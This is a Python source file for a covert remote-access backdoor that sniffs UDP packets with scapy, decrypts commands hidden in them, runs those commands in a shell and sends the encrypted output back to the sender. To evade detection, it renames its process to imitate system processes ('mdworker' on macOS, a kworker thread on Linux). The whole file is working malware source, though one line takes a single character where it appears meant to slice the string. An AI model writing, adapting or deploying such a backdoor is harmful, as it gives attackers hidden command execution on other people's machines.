import setproctitle
import os
import argparse
import platform
import subprocess
import time
import crypto
import logging
# supress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# string to use as unique identification for our backdoor
# we use this because ports might not be unique enough in all situations
# if you want to change this to another value make sure both the client and
# backdoor have the same string
authString = "This is not a backdoor"

# Function: runCommand
# Parameters: packet - packet that get passed in from scapy
#
# This function is passed to the scapy sniff call, and is called everytime a
# packet passes the sniff filter.  The function decrypts the raw data at the end
# of the packet and then runs the command via a subprocess.  The output of the
# subprocess, even if the command it ran errored out, is then encrypted and sent
# back to the client.
def runCommand(packet):
  encryptedData = packet['Raw'].load
  data = crypto.decrypt(encryptedData)
  # make sure the data starts with the authString, otherwise it isn't a packet
  # meant for our backdoor and we shouldn't process it
  if data.startswith(authString):
    data = data[len(authString)]
    print "Running command " + data
    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = authString + output.stdout.read() + output.stderr.read()
    encryptedOutput = crypto.encrypt(output)
    packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
    time.sleep(0.1)
    send(packet, verbose=0)

# Function: setProcessName
#
# This function is used to change the process title.  It checks which opert
def setProcessName():
  operatingSystem = platform.system()
  procName = ""
  if operatingSystem == 'Darwin':
    procName = "mdworker"
  elif operatingSystem == "Linux":
    procName = "[kworker/2:4]"
  # set the process title
  setproctitle.setproctitle(procName)

# argument parsing
parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port from sender.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port sender is sending to.'
                   , required=True)

args = parser.parse_args()
sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)

# main execution
setProcessName()
sniff(filter=sniffFilter, prn=runCommand)